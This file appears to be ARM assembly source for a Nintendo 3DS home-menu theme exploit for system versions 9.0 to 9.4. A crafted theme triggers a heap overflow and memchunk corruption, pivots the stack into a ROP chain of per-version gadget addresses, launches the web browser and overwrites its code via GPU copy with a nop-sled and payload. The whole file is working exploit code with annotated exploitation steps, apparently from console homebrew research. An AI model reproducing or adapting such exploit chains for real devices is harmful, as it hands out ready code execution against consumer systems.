.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)

#if SYSVER>=93 //v9.3-v9.4
#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
#define ROP_POPPC 0x10203c
#define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
#define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"

#define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
#else
#define ROP_LOADR4_FROMOBJR0 0x10b64c
#define ROP_POPPC 0x102028
#define POP_R4LR_BXR1 0x0011dda4
#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037d8
#define POP_R4R8LR_BXR2 0x00136d5c

#define CFGIPC_SecureInfoGetRegion 0x00139d0c
#endif

#if SYSVER == 93
#define SRV_GETSERVICEHANDLE 0x0022472c
#define POP_R1PC 0x002262bc
#elif SYSVER == 94
#define SRV_GETSERVICEHANDLE 0x0022470c
#define POP_R1PC 0x0022629c
#endif

#if SYSVER>=93 //v9.3-v9.4
#define POP_R0PC 0x00154f0c
#define POP_R3PC 0x00102a40
#define POP_R2R6PC 0x001512c4 //pop {r2, r3, r4, r5, r6, pc}

#define ROP_STR_R1TOR0 0x00103f58
#define ROP_LDR_R0FROMR0 0x0010f01c
#define ROP_LDRR1R1_STRR1R0 0x002003bc
#define ROP_MOVR1R3_BXIP 0x001c2e24
#define ROP_ADDR0_TO_R1 0x0012b64c

#define MEMCPY 0x00150940

#define svcSleepThread 0x0012b590

#define GXLOW_CMD4 0x0014ac9c
#endif

#if SYSVER <= 92 //v9.0-v9.2
#define ROP_STR_R1TOR0 0x00103f40
#define ROP_LDR_R0FROMR0 0x0010efe8
#define ROP_ADDR0_TO_R1 0x0012e708
#endif

#if SYSVER == 92
#define POP_R0PC 0x001575ac
#define POP_R1PC 0x00214988
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150160

#define ROP_LDRR1R1_STRR1R0 0x001f1e7c
#define ROP_MOVR1R3_BXIP 0x001b8708

#define MEMCPY 0x001536f8

#define svcSleepThread 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212de0

#define GXLOW_CMD4 0x0014d65c
#endif

#if SYSVER <= 91 //v9.0-v9.1j
#define POP_R0PC 0x00157554
#define POP_R1PC 0x002149f0
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150108

#define ROP_LDRR1R1_STRR1R0 0x001f1ee4
#define ROP_MOVR1R3_BXIP 0x001b8848

#define ROP_INITOBJARRAY 0x0020a40d

#define MEMCPY 0x001536a0

#define svcControlMemory 0x00212df0
#define svcSleepThread 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212e48

#define GXLOW_CMD4 0x0014d604

#define NSS_LaunchTitle 0x0020e6a8
#endif

#if SYSVER == 94
#define NSS_LaunchTitle 0x0022022c //inr0=procid out* inr1=unused inr2/inr3=u64 programid insp0=u8 mediatype

#define svcControlMemory 0x002246b4

#define ROP_INITOBJARRAY 0x002190a5
#endif

#if SYSVER == 93
#define NSS_LaunchTitle 0x0022024c

#define svcControlMemory 0x002246d4

#define ROP_INITOBJARRAY 0x002190c5
#endif

#if SYSVER == 92
#define NSS_LaunchTitle 0x0020e640

#define svcControlMemory 0x00212d88

#define ROP_INITOBJARRAY 0x0020a3a5
#endif

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000))//+0x162000
#endif

.macro ROP_SETLR lr
.word POP_R1PC
.word ROP_POPPC @ r1

.word POP_R4LR_BXR1
.word 0 @ r4
.word \lr
.endm

.macro ROP_SETLR_OTHER lr
.word POP_R2R6PC
.word ROP_POPPC @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word POP_R4R8LR_BXR2
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word \lr
.endm

.macro CALL_GXCMD4 srcadr, dstadr, cpysize
ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word \srcadr @ r0

.word POP_R1PC
.word \dstadr @ r1

.word POP_R2R6PC
.word \cpysize @ r2, size
.word 0 @ r3, width0
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word GXLOW_CMD4

.word 0 @ r2 / sp0 (height0)
.word 0 @ r3 / sp4 (width1)
.word 0 @ r4 / sp8 (height1)
.word 0x8 @ r5 / sp12 (flags)
.word 0 @ r6
.endm

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
.word HEAPBUF + (ropstackstart - _start) @ sp
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2ec) - .)
#if SYSVER > 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
#if SYSVER <= 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

.space ((vtable + 0x100) - .)

.space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).

tmpdata:

nss_outprocid:
.word 0

#if NEW3DS==0
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
#else
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
#endif

nsslaunchtitle_programidlow_list:
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN 

tmp_scratchdata:
.space 0x400

ropstackstart:

//Overwrite the top-screen framebuffers.
CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2

#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (tmp_scratchdata - _start)  @ r0, outaddr*

.word POP_R1PC
.word 0x0f000000 @ r1, addr0

.word POP_R2R6PC
.word 0 @ r2, addr1
.word 0x00400000 @ r3, size
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word svcControlMemory

.word 0x3 @ r2 / sp0 (operation)
.word 0x3 @ r3 / sp4 (permissions)
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
#endif

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (region_outval - _start) @ r0

.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.

.word 0 @ r2
.word 0 @ r3
region_outval:
.word 0 @ r4
.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
.word 0 @ r6

.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)

ROP_SETLR_OTHER ROP_POPPC

.word POP_R0PC

.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0

.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*

@ r1 isn't used by NSS_LaunchTitle so no need to set it here.

.word POP_R2R6PC
nsslaunchtitle_regload_programidlow:
.word 0 @ r2, programID low (overwritten by the above ROP)
.word 0x00040030 @ r3, programID high
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word NSS_LaunchTitle @ Launch the web-browser. The above programID is currently hardcoded for the Old3DS USA browser.

.word 0 @ r2 / sp0 (mediatype, 0=NAND)
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

//Overwrite the start of the browser .text with the below code.
CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, (codedataend-codedatastart)

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 1 second. The rest of the text on this line is only relevant for Old3DS. When the browser main-thread starts running, it runs for a while then stop running due to a context-switch triggered during .bss clearing. This allows that thread to resume running, at that point the code which was running would be already overwritten by the below code(initially it would execute the nop-sled).

.word POP_R1PC
.word ROP_BXR1 @ r1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148

.align 4
codedatastart:
#if NEW3DS==0
.space 0x200 @ nop-sled
#else
.space 0x200//0x1000
#endif
ldr r0, =0x58584148
ldr r0, [r0]
code_end:
b code_end
.pool

.align 4
codedataend:
.word 0

